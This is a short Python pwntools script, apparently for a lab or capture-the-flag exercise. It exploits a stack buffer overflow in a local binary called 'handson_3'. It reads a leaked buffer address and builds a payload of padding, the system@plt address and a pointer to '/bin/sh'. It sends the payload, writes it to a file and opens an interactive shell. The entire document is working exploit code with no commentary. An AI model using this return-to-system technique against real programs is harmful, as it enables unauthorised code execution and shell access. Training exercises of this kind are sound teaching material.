from pwn import *

target = process("./handson_3")
#target = remote("localhost", 4321)

system_plt = 0x8048390

_ = target.readuntil("buf1 = ") 
#buf1_addr = int(target.readline(), 16)

buf1_addr = int(target.readline(), 16)

print("buf addr : 0x{:x}".format(buf1_addr))

_ = target.readline()

payload = b"A" * 42
payload += p32(system_plt)
payload += b"BBBB"
payload += p32(buf1_addr + len(payload) + 4)
payload += b"/bin/sh\x00"

# payload = b"/bin/sh"
# payload += b"A" * (42 - len(payload))
# payload += p32(system_plt)
# payload += b"BBBB"
# payload += p32(buf1_addr)

with open('payload', 'wb') as f:
    f.write(payload)

    
target.sendline(payload)

target.interactive()
